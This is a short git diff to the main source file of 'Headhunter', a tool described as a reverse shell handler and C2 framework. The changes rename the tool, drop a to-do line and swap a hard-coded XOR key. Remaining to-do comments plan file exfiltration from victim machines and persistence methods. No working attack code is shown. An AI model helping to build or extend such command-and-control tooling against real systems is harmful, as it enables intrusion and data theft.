@@ -1,4 +1,4 @@
-// Headhunter - Reverse shell handler and payload generator
+// Headhunter - C2 Framework
 // Author: Logan Goins
 // 
 //
@@ -8,7 +8,6 @@
 // Implement command session command "exfil", which allows you to exfil files.
 // Implement server session command kill, which allows you to kill a connection to a victim machine.
 // Add better error handling on payload, as well as implement persistence methods
-// Implement XOR encryption between payload and server
 
 
 #include "server.c"
@@ -32,7 +31,7 @@ int parse_payload_generation(int argc, char **argv);
 int main(int argc, char **argv){
 	
 	// XOR key 
-	key = "secret";
+	key = "NCMzvxra3Lr8T5gPfPa68UYnQre0Hvgg"; // Insert your own random XOR key here
 	keylen = strlen(key);
 
 	// loop through argv and search for the command being entered
